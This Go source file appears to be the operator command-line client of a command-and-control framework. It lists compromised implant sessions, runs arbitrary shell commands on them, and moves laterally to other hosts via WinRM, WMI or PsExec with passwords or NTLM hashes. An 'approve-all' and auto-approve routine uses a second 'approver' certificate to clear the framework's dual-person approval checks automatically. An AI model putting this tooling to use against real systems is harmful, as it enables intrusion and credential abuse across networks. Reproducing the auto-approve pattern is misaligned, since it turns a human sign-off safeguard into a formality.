package erebuscli

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
	"google.golang.org/protobuf/proto"
)

// OpOptions configures non-interactive operator commands.
type OpOptions struct {
	Server           string
	CertFile         string
	KeyFile          string
	CAFile           string
	ApproverCertFile string
	ApproverKeyFile  string
}

// RunOp executes a one-shot operator command (sessions|shell|lateral|pending|approve-all).
func RunOp(opts OpOptions, args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: erebus op <sessions|shell|lateral|pending|approve-all|help> [args]")
	}
	if opts.Server == "" {
		opts.Server = "127.0.0.1:50051"
	}
	if opts.CertFile == "" || opts.KeyFile == "" || opts.CAFile == "" {
		c, k, ca := DefaultCertPaths()
		if opts.CertFile == "" {
			opts.CertFile = c
		}
		if opts.KeyFile == "" {
			opts.KeyFile = k
		}
		if opts.CAFile == "" {
			opts.CAFile = ca
		}
	}
	if opts.ApproverCertFile == "" || opts.ApproverKeyFile == "" {
		ac, ak := DefaultApproverCertPaths()
		if opts.ApproverCertFile == "" {
			opts.ApproverCertFile = ac
		}
		if opts.ApproverKeyFile == "" {
			opts.ApproverKeyFile = ak
		}
	}

	cmd := args[0]
	rest := args[1:]

	switch cmd {
	case "help", "-h", "--help":
		fmt.Print(opHelp)
		return nil
	case "sessions":
		return opSessions(opts)
	case "pending":
		return opPending(opts)
	case "approve-all":
		return opApproveAll(opts)
	case "shell":
		return opShell(opts, rest)
	case "lateral":
		return opLateral(opts, rest)
	default:
		return fmt.Errorf("unknown op command %q (try: erebus op help)", cmd)
	}
}

const opHelp = `erebus op — non-interactive operator commands (dual-seat auto-approve)

  erebus op sessions
  erebus op pending
  erebus op approve-all
  erebus op shell [--session ID] <command...>
  erebus op lateral winrm <target> <command> --user U --domain D (--pass P | --hash H)

Uses ~/.erebus/certs/operator*.pem and approver*.pem by default.
Flags (before subcommand): -server -cert -key -ca -approver-cert -approver-key

`

func dialOp(server, cert, key, caPath string) (*grpc.ClientConn, error) {
	certPair, err := tls.LoadX509KeyPair(cert, key)
	if err != nil {
		return nil, err
	}
	pem, err := os.ReadFile(caPath)
	if err != nil {
		return nil, err
	}
	pool := x509.NewCertPool()
	if !pool.AppendCertsFromPEM(pem) {
		return nil, fmt.Errorf("bad CA file %s", caPath)
	}
	tlsCfg := &tls.Config{
		Certificates: []tls.Certificate{certPair},
		RootCAs:      pool,
		MinVersion:   tls.VersionTLS12,
	}
	return grpc.NewClient(server, grpc.WithTransportCredentials(credentials.NewTLS(tlsCfg)))
}

func opSessions(opts OpOptions) error {
	conn, err := dialOp(opts.Server, opts.CertFile, opts.KeyFile, opts.CAFile)
	if err != nil {
		return err
	}
	defer conn.Close()
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	resp, err := pb.NewErebusC2Client(conn).ListSessions(ctx, &pb.ListSessionsRequest{})
	if err != nil {
		return err
	}
	for _, s := range resp.Sessions {
		fmt.Printf("session=%s implant=%s host=%s user=%s os=%s alive=%v last=%d\n",
			s.SessionId, s.ImplantId, s.Hostname, s.Username, s.Os, s.Alive, s.LastCheckin)
	}
	return nil
}

func opPending(opts OpOptions) error {
	conn, err := dialOp(opts.Server, opts.CertFile, opts.KeyFile, opts.CAFile)
	if err != nil {
		return err
	}
	defer conn.Close()
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	resp, err := pb.NewErebusC2Client(conn).ListPendingApprovals(ctx, &pb.ListPendingApprovalsRequest{})
	if err != nil {
		return err
	}
	for _, a := range resp.Approvals {
		fmt.Printf("id=%s session=%s type=%v risk=%s desc=%s\n",
			a.Id, a.SessionId, a.TaskType, a.RiskLevel, a.TaskDescription)
	}
	return nil
}

func opApproveAll(opts OpOptions) error {
	op, err := dialOp(opts.Server, opts.CertFile, opts.KeyFile, opts.CAFile)
	if err != nil {
		return err
	}
	defer op.Close()
	ap, err := dialOp(opts.Server, opts.ApproverCertFile, opts.ApproverKeyFile, opts.CAFile)
	if err != nil {
		return fmt.Errorf("approver dial (run: erebus certs seats): %w", err)
	}
	defer ap.Close()
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()
	opC := pb.NewErebusC2Client(op)
	apC := pb.NewErebusC2Client(ap)
	pend, err := opC.ListPendingApprovals(ctx, &pb.ListPendingApprovalsRequest{})
	if err != nil {
		return err
	}
	for _, a := range pend.Approvals {
		if _, err := apC.Approve(ctx, &pb.ApproveRequest{ApprovalId: a.Id}); err != nil {
			fmt.Fprintf(os.Stderr, "approve %s failed: %v\n", a.Id, err)
			continue
		}
		fmt.Println("approved", a.Id)
	}
	return nil
}

func pickAliveSession(ctx context.Context, c pb.ErebusC2Client, session string) (string, error) {
	if session != "" {
		return session, nil
	}
	resp, err := c.ListSessions(ctx, &pb.ListSessionsRequest{})
	if err != nil {
		return "", err
	}
	for _, s := range resp.Sessions {
		if s.Alive {
			return s.SessionId, nil
		}
	}
	return "", fmt.Errorf("no alive session")
}

func opShell(opts OpOptions, args []string) error {
	session := ""
	cmdParts := args
	if len(args) >= 2 && (args[0] == "--session" || args[0] == "-s") {
		session = args[1]
		cmdParts = args[2:]
	}
	// Allow "shell --session ID -- cmd" and "shell -- cmd"
	if len(cmdParts) > 0 && cmdParts[0] == "--" {
		cmdParts = cmdParts[1:]
	}
	if len(cmdParts) == 0 {
		return fmt.Errorf("usage: erebus op shell [--session ID] [--] <command...>")
	}
	command := strings.Join(cmdParts, " ")

	op, err := dialOp(opts.Server, opts.CertFile, opts.KeyFile, opts.CAFile)
	if err != nil {
		return err
	}
	defer op.Close()
	ap, err := dialOp(opts.Server, opts.ApproverCertFile, opts.ApproverKeyFile, opts.CAFile)
	if err != nil {
		return fmt.Errorf("approver dial (run: erebus certs seats): %w", err)
	}
	defer ap.Close()

	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
	defer cancel()
	opC := pb.NewErebusC2Client(op)
	apC := pb.NewErebusC2Client(ap)

	sid, err := pickAliveSession(ctx, opC, session)
	if err != nil {
		return err
	}
	fmt.Println("using session", sid)

	data, _ := proto.Marshal(&pb.ShellTask{Command: command})
	return executeWithAutoApprove(ctx, opC, apC, sid, pb.TaskType_TASK_SHELL, data, func(res *pb.TaskResult) error {
		if res == nil {
			return fmt.Errorf("nil result")
		}
		if res.Error != "" {
			fmt.Fprintf(os.Stderr, "error: %s\n", res.Error)
		}
		sr := &pb.ShellResult{}
		if err := proto.Unmarshal(res.Data, sr); err == nil {
			fmt.Print(sr.Stdout)
			if sr.Stderr != "" {
				fmt.Fprint(os.Stderr, sr.Stderr)
			}
			fmt.Printf("success=%v exit=%d\n", res.Success, sr.ExitCode)
			return nil
		}
		fmt.Printf("success=%v data=%d bytes\n", res.Success, len(res.Data))
		return nil
	})
}

func opLateral(opts OpOptions, args []string) error {
	// lateral winrm <target> <command...> --user --domain --pass|--hash [--session]
	if len(args) < 3 {
		return fmt.Errorf("usage: erebus op lateral winrm <target> <command> --user U --domain D (--pass P|--hash H) [--session ID]")
	}
	method := args[0]
	target := args[1]
	rest := args[2:]

	var commandParts []string
	flags := map[string]string{}
	for i := 0; i < len(rest); i++ {
		a := rest[i]
		if strings.HasPrefix(a, "--") {
			key := a
			val := ""
			if i+1 < len(rest) && !strings.HasPrefix(rest[i+1], "--") {
				i++
				val = rest[i]
			}
			flags[key] = val
			continue
		}
		commandParts = append(commandParts, a)
	}
	command := strings.Join(commandParts, " ")
	if command == "" {
		return fmt.Errorf("command required")
	}
	if method != "winrm" && method != "wmi" && method != "psexec" {
		return fmt.Errorf("unsupported method %q", method)
	}

	cfg := &pb.LateralMoveConfig{
		Method:   method,
		Target:   target,
		Command:  command,
		Username: flags["--user"],
		Password: flags["--pass"],
		Domain:   flags["--domain"],
		NtlmHash: flags["--hash"],
	}
	if cfg.Username == "" {
		return fmt.Errorf("--user required")
	}
	if cfg.Password == "" && cfg.NtlmHash == "" {
		return fmt.Errorf("--pass or --hash required")
	}

	op, err := dialOp(opts.Server, opts.CertFile, opts.KeyFile, opts.CAFile)
	if err != nil {
		return err
	}
	defer op.Close()
	ap, err := dialOp(opts.Server, opts.ApproverCertFile, opts.ApproverKeyFile, opts.CAFile)
	if err != nil {
		return fmt.Errorf("approver dial (run: erebus certs seats): %w", err)
	}
	defer ap.Close()

	ctx, cancel := context.WithTimeout(context.Background(), 180*time.Second)
	defer cancel()
	opC := pb.NewErebusC2Client(op)
	apC := pb.NewErebusC2Client(ap)

	sid, err := pickAliveSession(ctx, opC, flags["--session"])
	if err != nil {
		return err
	}
	fmt.Println("using session", sid)

	data, err := proto.Marshal(cfg)
	if err != nil {
		return err
	}
	return executeWithAutoApprove(ctx, opC, apC, sid, pb.TaskType_TASK_LATERAL_MOVE, data, func(res *pb.TaskResult) error {
		if res == nil {
			return fmt.Errorf("nil result")
		}
		fmt.Printf("success=%v err=%q\n", res.Success, res.Error)
		var lr pb.LateralMoveResult
		if err := proto.Unmarshal(res.Data, &lr); err == nil {
			fmt.Printf("method=%s target=%s success=%v\n--- output ---\n%s\n", lr.Method, lr.Target, lr.Success, lr.Output)
			return nil
		}
		fmt.Printf("raw data %d bytes\n", len(res.Data))
		return nil
	})
}

func executeWithAutoApprove(
	ctx context.Context,
	opC, apC pb.ErebusC2Client,
	session string,
	tt pb.TaskType,
	data []byte,
	handle func(*pb.TaskResult) error,
) error {
	type result struct {
		resp *pb.ExecuteTaskResponse
		err  error
	}
	done := make(chan result, 1)
	go func() {
		r, err := opC.ExecuteTask(ctx, &pb.ExecuteTaskRequest{
			SessionId: session,
			TaskType:  tt,
			Data:      data,
			Wait:      true,
			TimeoutMs: 120000,
		})
		done <- result{r, err}
	}()

	deadline := time.Now().Add(45 * time.Second)
	for time.Now().Before(deadline) {
		select {
		case r := <-done:
			if r.err != nil {
				return r.err
			}
			return handle(r.resp.Result)
		case <-time.After(200 * time.Millisecond):
			// ListPendingApprovals is approver-role only.
			pend, err := apC.ListPendingApprovals(ctx, &pb.ListPendingApprovalsRequest{})
			if err != nil {
				continue
			}
			for _, a := range pend.Approvals {
				if a.SessionId != session {
					continue
				}
				if _, err := apC.Approve(ctx, &pb.ApproveRequest{ApprovalId: a.Id}); err != nil {
					fmt.Fprintf(os.Stderr, "approve failed: %v\n", err)
					continue
				}
				fmt.Println("approved", a.Id)
			}
		}
	}
	r := <-done
	if r.err != nil {
		return r.err
	}
	return handle(r.resp.Result)
}

// RunCertsSeats ensures operator + approver client certs exist under dataDir.
func RunCertsSeats(dataDir string) error {
	if dataDir == "" {
		dataDir = DataDir()
	}
	s, err := EnsureSeatCerts(dataDir)
	if err != nil {
		return err
	}
	fmt.Printf("operator cert: %s\n", s.OperatorCert)
	fmt.Printf("approver cert: %s\n", s.ApproverCert)
	fmt.Printf("ca:            %s\n", s.CA)
	fmt.Printf("cert dir:      %s\n", filepath.Dir(s.OperatorCert))
	return nil
}
